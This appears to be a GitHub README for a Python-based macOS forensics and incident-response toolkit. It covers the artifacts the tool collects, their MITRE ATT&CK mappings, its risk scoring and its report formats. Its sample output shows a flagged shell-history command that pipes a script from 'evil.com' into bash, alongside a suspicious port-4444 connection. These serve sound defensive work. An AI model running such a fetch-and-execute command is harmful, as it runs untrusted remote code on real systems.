# 🍎 macOS Digital Forensics Incident Response (DFIR) Toolkit

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-macOS-lightgrey.svg)](https://www.apple.com/macos/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![MITRE](https://img.shields.io/badge/MITRE-ATT&CK-red.svg)](https://attack.mitre.org/)

A comprehensive Python-based digital forensics and incident response tool designed specifically for macOS environments. Automatically collects forensic artifacts, maps findings to the MITRE ATT&CK framework, and exports structured reports for investigation.

---

## 📋 Table of Contents

- [Features](#-features)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [Artifact Coverage](#-artifact-coverage)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [Output Format](#-output-format)
- [Risk Scoring](#-risk-scoring)
- [Screenshots](#-screenshots)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🚀 Features

| Feature | Description |
|---------|-------------|
| **17 Artifact Categories** | Comprehensive coverage of macOS forensic artifacts |
| **MITRE ATT&CK Mapping** | Automatic correlation with macOS-specific attack techniques |
| **Risk Scoring** | Intelligent 0-100 scoring based on suspicious indicators |
| **CSV Export** | Structured output for spreadsheet analysis and SIEM ingestion |
| **JSON Summary** | Machine-readable summary with collection statistics |
| **Plist Parsing** | Native Apple property list parsing |
| **SQLite Analysis** | Direct database queries for Safari, Chrome, TCC, and quarantine data |
| **Unified Log Queries** | macOS 10.12+ unified logging system integration |
| **Privilege Detection** | Identifies sudo abuse and privilege escalation attempts |
| **No External Dependencies** | Pure Python standard library (3.8+) |

---

## 📦 Requirements

### System Requirements
- **Operating System**: macOS 10.14 (Mojave) or later
- **Python**: 3.8 or higher
- **Privileges**: Root/sudo recommended for full artifact access

### Python Standard Library Modules Used
```python
os, sys, json, csv, hashlib, sqlite3, plistlib, subprocess, 
datetime, re, glob, pathlib, collections, typing, dataclasses
```

> **Note**: No pip install required. Uses only Python standard library modules.

---

## 🔧 Installation

### Option 1: Clone Repository
```bash
git clone https://github.com/yourusername/macos-dfir-toolkit.git
cd macos-dfir-toolkit
```

### Option 2: Download Directly
```bash
curl -O https://raw.githubusercontent.com/yourusername/macos-dfir-toolkit/main/macos_dfir.py
chmod +x macos_dfir.py
```

### Verify Installation
```bash
python3 --version  # Should be 3.8+
python3 macos_dfir.py --help
```

---

## 🖥️ Usage

### Basic Usage (Current User)
```bash
python3 macos_dfir.py
```

### Full Collection (Recommended)
```bash
sudo python3 macos_dfir.py
```

### Custom Output Directory
```bash
sudo python3 macos_dfir.py
# When prompted, enter: /path/to/output
```

### Automated Execution
```bash
# Non-interactive mode with custom output
echo "/var/forensics/case_001" | sudo python3 macos_dfir.py
```

---

## 🔍 Artifact Coverage

### Persistence Mechanisms
| Artifact | Path | MITRE Technique |
|----------|------|-----------------|
| LaunchAgents | `~/Library/LaunchAgents` | T1543.001 |
| LaunchDaemons | `/Library/LaunchDaemons` | T1543.004 |
| Login Items | System Events API | T1547.007 |
| Cron Jobs | `/etc/crontab`, `/var/at/tabs` | T1053.003 |
| Kernel Extensions | `/Library/Extensions` | T1547.006 |
| Background Tasks | BTM Database (macOS 13+) | T1543.001 |

### Execution Evidence
| Artifact | Path | MITRE Technique |
|----------|------|-----------------|
| Bash History | `~/.bash_history` | T1059.004, T1070.003 |
| Zsh History | `~/.zsh_history` | T1059.004, T1070.003 |
| Install History | `/Library/Receipts/InstallHistory.plist` | T1072 |
| Quarantine Events | `~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2` | T1553.001 |

### Credential Access
| Artifact | Path | MITRE Technique |
|----------|------|-----------------|
| Keychain | `~/Library/Keychains/login.keychain-db` | T1555.001 |
| SSH Keys | `~/.ssh/authorized_keys` | T1021.004 |
| TCC Database | `~/Library/Application Support/com.apple.TCC/TCC.db` | T1562.001 |

### Defense Evasion
| Artifact | Path | MITRE Technique |
|----------|------|-----------------|
| Gatekeeper Logs | Unified Log | T1553.001 |
| Hidden Files | User home directory | T1564.001 |
| Temp Files | `/tmp`, `/var/tmp` | T1074.001 |
| Sudo Logs | `/var/log/system.log` | T1548.003 |

### Discovery & Collection
| Artifact | Path | MITRE Technique |
|----------|------|-----------------|
| User Accounts | `dscl` API | T1087.001, T1136.001 |
| Browser History | Safari/Chrome/Firefox DBs | T1071.001, T1567.002 |
| Network Connections | `netstat`, `lsof` | T1049, T1046 |
| System Logs | Unified Log | T1070.002 |

---

## 🎯 MITRE ATT&CK Mapping

The tool maps findings to the following MITRE ATT&CK techniques:

### Tactics Covered
- **Initial Access** (T1566.001, T1566.002, T1078.001)
- **Execution** (T1059.004, T1059.007, T1553.001, T1204.002)
- **Persistence** (T1543.001, T1543.004, T1547.007, T1547.011, T1136.001)
- **Privilege Escalation** (T1548.001, T1548.003, T1053.003, T1037.002)
- **Defense Evasion** (T1070.002, T1070.003, T1070.004, T1070.006, T1564.001, T1564.002, T1562.001)
- **Credential Access** (T1552.001, T1555.001, T1003.008, T1056.001)
- **Discovery** (T1083, T1087.001, T1049, T1057, T1518.001, T1082)
- **Lateral Movement** (T1021.004, T1021.005, T1550.002)
- **Collection** (T1560.001, T1125, T1113, T1115, T1005, T1074.001)
- **Command and Control** (T1071.001, T1071.004, T1571, T1573.002, T1105, T1219)
- **Exfiltration** (T1041, T1048.001, T1567.002, T1020)
- **Impact** (T1486, T1490, T1529)

---

## 📊 Output Format

### Directory Structure
```
forensics_output/
├── macos_forensics_report.csv    # Main CSV report
└── forensics_summary.json        # JSON summary with statistics
```

### CSV Columns
| Column | Description |
|--------|-------------|
| `artifact_type` | Category of forensic artifact |
| `source_path` | File path or system source |
| `description` | Human-readable description |
| `timestamp` | ISO 8601 timestamp |
| `mitre_techniques` | Semicolon-separated MITRE technique IDs |
| `risk_score` | Integer 0-100 |
| `data` | JSON-encoded structured data |
| `raw_content` | Truncated raw artifact content |

### JSON Summary Structure
```json
{
  "system_info": {
    "hostname": "MacBook-Pro",
    "os_version": "14.2.1",
    "build_version": "23C71",
    "hardware_uuid": "XXX-XXX-XXX",
    "serial_number": "XXXXX"
  },
  "collection_stats": {
    "total_artifacts": 150,
    "high_risk_count": 12,
    "by_type": { "Persistence_LaunchItem": 45, ... },
    "by_mitre_technique": { "T1543.001": 30, ... }
  },
  "artifacts": [ ... ]
}
```

---

## ⚠️ Risk Scoring

| Score | Severity | Description |
|-------|----------|-------------|
| 0-30 | 🟢 Low | Normal system artifacts, standard configurations |
| 31-50 | 🟡 Medium | Unusual but potentially legitimate activity |
| 51-70 | 🟠 High | Suspicious indicators requiring investigation |
| 71-90 | 🔴 Critical | Strong evidence of malicious activity |
| 91-100 | ⚫ Severe | Confirmed malicious indicators |

### Scoring Factors
- **Program Path**: `/tmp/`, `/var/tmp/`, hidden directories (+30)
- **Execution Frequency**: Intervals < 5 minutes (+15)
- **Process Hiding**: `nice`, `nohup` usage (+10)
- **Network Indicators**: Known C2 ports (+30)
- **Credential Access**: Keychain dumping attempts (+40)
- **Privilege Escalation**: Sudo shell execution (+30)

---

## 📸 Example Output

```
[*] Starting macOS Forensic Collection on MacBook-Pro
[*] OS Version: 14.2.1 (23C71)
[*] Collection Time: 2024-01-15T10:30:00
================================================================================

[*] Collecting: Launch Agents/Daemons
[+] Collected: Persistence_LaunchItem - LaunchAgent: com.example.backdoor.plist (Risk: 75)

[*] Collecting: Shell History
[+] Collected: Execution_ShellHistory - Suspicious command: curl -s http://evil.com/payload | bash (Risk: 85)

[*] Collecting: Network Connections
[+] Collected: Network_Connection - Active connection: 192.168.1.100:4444 (Risk: 60)

================================================================================
COLLECTION SUMMARY
================================================================================
Total Artifacts: 150
High Risk Items (>=70): 12

Artifacts by Type:
  - Persistence_LaunchItem: 45
  - Network_Connection: 23
  - Execution_ShellHistory: 18

MITRE ATT&CK Techniques Detected:
  - T1543.001 (Launch Agent): 30 occurrences
  - T1059.004 (Unix Shell): 25 occurrences
  - T1071.001 (Web Protocols): 20 occurrences

[+] CSV Report exported to: ./forensics_output/macos_forensics_report.csv
[+] JSON Summary exported to: ./forensics_output/forensics_summary.json
```

---

## 🔬 Forensic Use Cases

### Incident Response
- Rapid triage of compromised macOS endpoints
- Identifying persistence mechanisms
- Tracking attacker command execution

### Threat Hunting
- Proactive detection of MITRE ATT&CK techniques
- Baseline deviation analysis
- Anomaly detection in system configurations

### Compliance & Auditing
- User activity monitoring
- Privilege escalation detection
- Data exfiltration evidence collection

### Malware Analysis
- Quarantine event analysis
- Gatekeeper bypass detection
- Suspicious process identification

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Areas for Contribution
- Additional artifact collectors
- Enhanced MITRE technique coverage
- Improved risk scoring algorithms
- GUI interface
- Timeline visualization
- Integration with SIEM platforms

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ⚖️ Disclaimer

> **IMPORTANT**: This tool is intended for authorized security research, incident response, and forensic analysis only. 

- Always obtain proper authorization before running on any system
- Respect privacy laws and organizational policies
- The authors assume no liability for misuse or damage
- Some features require root privileges and may impact system performance
- Test in a controlled environment before production use

**Use responsibly and ethically.**

---

## 📚 References

- [MITRE ATT&CK for macOS](https://attack.mitre.org/matrices/enterprise/macos/)
- [Apple macOS Security Guide](https://support.apple.com/guide/security/welcome/web)
- [macOS Forensics Artifacts](https://forensicswiki.xyz/page/Mac_OS_X)
- [Unified Logging Documentation](https://developer.apple.com/documentation/os/logging)

---

## 📧 Contact

For questions, issues, or feature requests:
- **Email**: moeaqeel@potonmail.com
- **Twitter**: https://x.com/MoeA193 

---

<p align="center">
  <b>Built with ❤️ for the DFIR community</b><br>
  <i>Hunt smart. Respond fast.</i>
</p>
